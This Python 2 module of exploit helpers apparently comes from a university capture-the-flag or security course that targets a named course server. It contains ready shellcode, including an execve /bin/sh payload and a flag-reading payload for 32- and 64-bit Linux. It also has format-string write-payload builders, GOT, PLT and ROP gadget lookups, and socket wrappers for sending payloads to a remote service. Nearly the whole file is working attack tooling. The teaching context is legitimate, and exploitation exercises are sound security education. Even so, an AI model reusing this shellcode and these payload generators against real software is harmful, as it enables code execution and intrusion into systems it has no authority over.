#!/usr/bin/env python2

#
# USE.
#   from exploit import *
#

import os
import struct
import subprocess as sp
import time
import commands
import pexpect
import optparse
import socket

ROOT = os.path.dirname(__file__)
ROPPER = os.path.join(ROOT, "../../bin/ropper")

SHELLCODE32 = """\
\x68\x61\x67\x2f\x2f\x68\x63\x2f\x66\x6c\x68\x2f\x70\x72\x6f\x89\
\xe6\x31\xc0\x46\x89\x46\x09\x4e\x89\xe7\x66\x81\xef\x10\x04\x89\
\xf3\x89\xc1\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x89\xf9\x31\xd2\x66\
\xba\x10\x04\x31\xc0\xb0\x03\xcd\x80\x89\xc2\x89\xf9\x31\xdb\x43\
\x31\xc0\xb0\x04\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\
"""

SHELLCODE32_BINSH = """\
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
\x53\x89\xe1\xb0\x0b\xcd\x80\
"""
# NOTE. require a valid stack as it puts the flag on top of it
SHELLCODE64 = """\
\x48\xbf\x61\x67\x2f\x2f\x2f\x2f\x2f\x2f\x57\x48\xbf\x2f\x70\x72\
\x6f\x63\x2f\x66\x6c\x57\x48\x89\xe7\x48\x31\xc0\x48\xff\xc7\x48\
\x89\x47\x09\x48\xff\xcf\x48\x89\xc6\xb0\x02\x0f\x05\x48\x89\xc7\
\x48\x89\xe6\x66\x81\xee\x10\x04\x48\x31\xd2\x66\xba\x10\x04\x48\
\x31\xc0\xb0\x00\x0f\x05\x48\x89\xc2\x48\x31\xff\x48\xff\xc7\x48\
\x31\xc0\xb0\x01\x0f\x05\x48\x31\xff\x48\x89\xf8\xb0\x3c\x0f\x05\
"""

SHELLCODE64_BINSH = """\
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\
\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\
"""

def pack(n):
    # XXX. change dep on arch
    return struct.pack("<I", n)

def p32(n):
    return struct.pack("<I", n)

def ps32(n):
    return struct.pack("<i", n)

def p64(n):
    return struct.pack("<Q", n)

def run_gdb(env, *cmds):
    gdb = os.environ.get("GDB", "gdb")
    args = [gdb, cmds[0], "--args"] + list(cmds)
    return os.spawnvpe(os.P_WAIT, args[0], args, env)

def run(env, *cmds):
    out = ""
    if "DEBUG" in os.environ:
        run_gdb(env, *cmds)
    else:
        p = sp.Popen(cmds, env=env, stdout=sp.PIPE, universal_newlines=False)
        out = p.stdout.read()
        p.wait()
    return out

def run_input(env, stdin, *cmds):
    if "DEBUG" in os.environ:
        pn = "/tmp/stdin"
        open(pn, "w").write(stdin)
        print "NOTE. use %s" % pn
        run_gdb(env, *cmds)
        return None

    p = sp.Popen(cmds, env=env, stdout=sp.PIPE, stdin=sp.PIPE, universal_newlines=False)
    p.stdin.write(stdin)
    out = p.stdout.read()
    p.wait()

    return out

def sh(env, *cmds):
    p = sp.Popen(cmds, env=env, stdout=sp.PIPE, universal_newlines=False)
    out = p.stdout.read()
    p.wait()
    return out

def nm(binary, sym):
    # TODO. replace it with readelf lib
    for l in commands.getoutput("nm %s" % binary).splitlines():
        if l.endswith(" %s" % sym):
            (addr, kind, name) = l.split()
            return int(addr, 16)
    raise "Failed to locate"

def got(binary, sym):
    for l in commands.getoutput("readelf -r %s" % binary).splitlines():
        if l.endswith(" %s" % sym):
            return int(l.split()[0], 16)
        if l.endswith(" %s + 0" % sym):
            return int(l.split()[0], 16)
    raise "Failed to find got"

def ln(src, dst):
    if os.path.exists(dst):
        return
    os.symlink(src, dst)

def rm(pn):
    if os.path.exists(pn):
        os.unlink(pn)

def sub_byte(a, b):
    # calculate a - b
    if (b > a):
        a += 0x100
    return a - b

def sub_word(a, b):
    # calculate a - b
    if (b > a):
        a += 0x10000
    return a - b

def up32(s):
    return struct.unpack('<I', s)[0]

def up64(s):
    return struct.unpack('<Q', s)[0]

def fsb32(gap, addr, string, pre = 0):
    # per byte
    payload = ''
    length = len(string)
    # put addresses
    for i in xrange(length):
        payload += p32(addr + i)
        pre += 4

    assert pre < 0x100

    for i in xrange(length):
        target = ord(string[i])
        if target != pre:
            payload += "%{0}c".format(sub_byte(target, pre))
            pre = target

        payload += "%{0}$n".format(gap + i)
    return payload

def fsb32hn(gap, addr, string, pre = 0):
    payload = ''
    length = len(string)
    assert length % 2 == 0
    
    # put addresses
    for i in range(length/2):
        payload += p32(addr + i*2)
        pre += 4

    assert pre < 0x10000

    for i in range(length/2):
        target = (ord(string[i*2+1]) << 8) + ord(string[i*2])
        if target != pre:
            payload += "%{0}c".format(sub_word(target, pre))
            pre = target

        payload += "%{0}$hn".format(gap + i)
    return payload

def plt(binary, sym):
    # TODO : replace this
    cmd = 'objdump -D %s|grep "<%s@plt>"' % (binary, sym)
    for l in commands.getoutput(cmd).splitlines():
        splited = l.split(' ')
        if (splited[1] == '<%s@plt>:' % sym):
            return int(splited[0], 16)
    raise 'Failed to find plt'

# TODO.
#  - persistently memoize per hash(pn)
def ropper_str_addr(pn, needle):
    cmd = "%s --file '%s' --nocolor --string '%s'" % (ROPPER, pn, needle)
    out = commands.getoutput(cmd)
    for l in out.splitlines():
        if l.endswith(needle):
            return int(l.split()[0], 16)
    raise "Failed to find %s" % needle

def ropper_gadget_addr(pn, gadget):
    cmd = "%s --file '%s' --nocolor --search '%s'" % (ROPPER, pn, gadget)
    out = commands.getoutput(cmd)
    for l in out.splitlines():
        if l.startswith("0x") and ":" in l:
            print "NOTE: using %s" % l
            return int(l.split(":")[0], 16)
    raise "Failed to find %s" % gadget

def ldd(pn, lib):
    out = commands.getoutput("ldd '%s'" % pn)
    for l in out.splitlines():
        if lib in l and "=>" in l:
            (lhs, rhs) = l.split("=>")
            return rhs.split()[0].strip()
    raise "Failed to find %s" % lib

# remote utils
def parse_port():
    parser = optparse.OptionParser()
    parser.add_option("-p", "--port",
                      help="port", dest="port", default=None)
    parser.add_option("-s", "--server",
                      help="host", dest="host", default="trypticon.gtisc.gatech.edu")
    (opts, args) = parser.parse_args()

    # tweak
    if "PORT" in os.environ:
        opts.port = os.environ["PORT"]
    if "SERVER" in os.environ:
        opts.host = os.environ["SERVER"]

    return (opts, args)

def xopen(target, host, port):
    if "DEBUG" in os.environ:
        return sp.Popen(target, stdout=sp.PIPE, stdin=sp.PIPE)
    # network
    p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    p.connect((host, int(port)))
    return [p, p.makefile()]

def xreadline(p):
    if "DEBUG" in os.environ:
        return p.stdout.readline()
    try:
        return p[1].readline()
    except socket.error as e:
        return ""        

def xwrite(p, out):
    if "DEBUG" in os.environ:
        p.stdin.write(out)
        return
    p[1].write(out)
    p[1].flush()
    
def xclose(p):
    if "DEBUG" in os.environ:
        p.terminate()
        return
    p[1].close()
    p[0].close()

def wait(p):
    print "sudo gdb -p %s" % p.pid
    raw_input()